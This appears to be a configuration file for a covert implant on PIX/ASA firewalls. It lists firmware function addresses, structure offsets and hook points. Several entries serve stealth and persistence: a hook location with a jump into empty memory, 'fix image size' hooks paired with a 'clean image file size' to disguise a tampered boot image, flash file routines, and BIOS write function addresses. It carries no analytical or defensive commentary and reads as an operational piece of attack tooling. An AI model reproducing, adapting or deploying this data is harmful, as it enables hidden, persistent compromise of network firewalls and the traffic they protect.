; --- SECTION I ---
;
0x40080403            // pix version
0x1d4e000             // address of implant configuration
0x0   0x089bf460      // allocb
0x1   0x089bedc0      // freeb
0x2   0x080619c0      // open (7.0(+) this is an array for Channel Stuff)
0x3   0x084bd9b0      // ip_put
0x4   0x08061b20      // close
0x5   0x09157ce0      // atoip
0x6   0x091892ac      // memset
0x7   0x0916f010      // memmove
0x8   0x089bec30      // malloc_call_calloc
0x9   0x0916ea90      // free
0xa   0x09185220      // printf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x00000068      // metaframe offset in block structure
0xe   0x00000084      // interface semiphore in metaframe
0xf   0x09170800      // rand
0x15  0x0805fe20      // process_create
0x16  0x0805f7c0      // process_suspend
0x17  0x0805eff0      // process_sleep_for
0x18  0x087ff6f0      // show_process
0x19  0x0000001c      // offset to security level in int_struct
0x1a  0x09b7d5c0      // cur_t
0x1b  0x04            // channel offset in interface struct
0x1c  0x0c            // PUT offset in channel struct
0x1d  0x24            // offset to dest mac in arp structure
0x1e  0x10            // offset to next hop ip in route structure
0x1f  0x20            // size of route struct
0x20  0x084c0a80      // calc_ip_cksum
0x21  0x084c1a70      // arp_loopkup
0x22  0x084bfee0      // set_block_hdr_mac_and_proto
0x23  0x084d15f0      // get hardware interface
0x24  0x0877a380      // get next hop
0x25  0x0877a620      // get route
0x26  0x084bbb60      // send_it
0x27  0x084c3890      // arp_create
0x28  0x0885aa40      // get_hw_iface_2
0x2a  0x3c            // pointer to ethernet frame
0x2b  0x34            // wptr structure offset
0x2c  0x1c            // inIfc (incoming interface) structure offset
0x2e  0x000001ac      // offset from cur_t that contains the current context number
0x2f  0x09aa0c00      // pointer to channnel list
0x30  0x096fece0      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000020      // offset to IP address in int_struct
0x33  0x00000018      // iface struct adjust from metaframe
0x34  0x09aadb54      // max number of interface cards
0x35  0x09b7dde0      // internal_clock
0x36  0x08858500      // get_interface_mac
0x37  0x00000153      // offset to hardware interface number in interface struct
0x38  0x00            // offset to ip in route structure
0x39  0x00            // offset to interface num in route structure
0x3a  0x00000424      // offset to send channel in channel list
0x3b  0x08418200      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x084182e0      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x08417840      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x08418120      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x00000018      // offset to next IP fragment pointer in block
0x40  0x09b9dfe0      // address of context list
0x42  0x09187ae0      // checkheaps checksum location
0x43  0x084af4c0      // get booted image's filename
0x44  0x0835ddff      // fix image size hook point
0x45  0x01a20368      // clean image file size
0x46  0xffffffff      // asa fix image size hook point
0x47  0x2c            // offset to filesize in file info struct
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation              0x0866199a      // address of our hook point
HookedCall                0x08665190      // called function being hooked
JmpLocation               0x090727ba      // empty area to jump to
InterfaceAddr             0x096fece0      // same as 0x30 above
InterfaceLeng             0x00000218      // length of interface struct
IntSecurityOffset         0x1c            // security level field offset
IntNameOffset             0x000001e8      // interface name field offset
IntNumOffset              0x00000153      // interface number field offset
IntVlanOffset             0x10            // same as 0xc above
IntIPOffset               0x20            // ip address offset in the interface struct
IntNetmaskOffset          0x24            // netmask in the iface struct
FlashClassAddr            0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr          0x09b83764      // addr of crypto structure
ArpTableAddrPtr           0x096eece8      // addr of first entry in ARP table
NumInterfaces             0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2              0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len           0x00            // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr             0x09b8f900      // addr of the bios class structure
BiosWriteAddr1            0x08356ed0      // addr of the bios write function for one specific bios
BiosWriteAddr2            0x083596c0      // addr of the bios write function for one specific bios
BiosWriteAddr3            0x08359150      // addr of the bios write function for one specific bios
BiosWriteAddr4            0x08359fa0      // addr of the bios write function for one specific bios
BiosWriteOffset           0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress         0x08418df0      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
